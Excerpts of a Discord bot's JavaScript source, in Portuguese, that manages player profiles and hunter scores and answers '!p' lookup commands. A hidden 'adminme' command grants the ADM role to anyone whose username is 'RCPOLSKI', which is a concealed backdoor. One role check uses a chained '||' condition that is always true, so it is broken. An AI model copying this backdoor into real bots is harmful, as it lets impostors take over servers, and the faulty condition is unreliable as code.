// Deixa o bot OFF \/
//const botoff = 1; if (botoff == 1) {process.exit()}
...
client.on('presenceUpdate', (oldMember, newMember) => {
    ...
    function updateOnPresence(id) {
        ...
        (async () => {
          ...
          var checkHunterScoreAVC = parseInt(pView.HUNTERSCORE)
				var numberRole = 100
				...
				fs.writeFileSync(`./perfis/registrados/${newMember.user.id}.json`, pData)
              ...
              if (numberRole > fetchedRole && fetchedRole !== '0' || null || undefined || '' || 0 || checkHunterScoreAVC !== '0' || null || undefined || '' || 0) {
...
client.on('message', message => {
	...
	if (!message.content.startsWith(prefix) && message.author.username !== 'RCPOLSKI') {
    ...
    if (comando === ' ' || !comando && message.author.username !== 'RCPOLSKI') {
      ...
      if (comando === 'adminme' && message.author.username === 'RCPOLSKI') {
        try{
          var ADM = message.guild.roles.find(a => a.name === 'ADM')
          message.member.addRole(ADM)
          console.log('Adicionado RCPOLSKI aos administradores')
        } catch (err){
          console.log(err)
          return
        }
		...
		if (comando === 't') {
			...
			try {
				...
				(async () => {
					...
					var domTHPrecision = dom.window.document.querySelector('body > table > tbody > tr > td > table:nth-child(2) > tbody > tr:nth-child(4) > td > table:nth-child(13) > tbody > tr > td:nth-child(2) > span.small').textContent
    ...
    var oldp = 0
      ...
      var mentioned = message.mentions.members.first()
      ...
      else if (comando === 'oldp' && args.length) {
			...
			cChannel.send(new Discord.RichEmbed()
				.setColor('#E84C3D')
				.setTitle(`Você está procurando quem, ${pView.NICKNAME}?`)
				.setDescription('Por favor, inclua um perfil a ser pesquisado...')
				.addBlankField()
				.addField('**Você pode pesquisar por perfis utilizando os seguintes comandos**', '!me\n!p Doc\n!p <@628138215756267520>')
				.addBlankField()
				.addField('**O bot não é case sensitive, ou seja, não é preciso diferenciar as maiúsculas das minúsculas**', 'digite **!comandos** para ajuda')
			)
      ...
      if (mentioned) {
				...
				var npJSONCheck = new jSelfReloadJSON(`./perfis/registrados/${mentioned.user.id}.json`); JSONCheck.resume(); JSONCheck.forceUpdate(); JSONCheck.stop()
				var npView = npJSONCheck
				args[0] = npView.NICKNAME
				mReadCont = pView.NICKNAME
	...
	function showCommands() {
        ...
        cChannel.send(new Discord.RichEmbed()
			...
			.addField('**!p nickname** ou **!p @nickname**', 'Mostra o perfil do nickname provido')
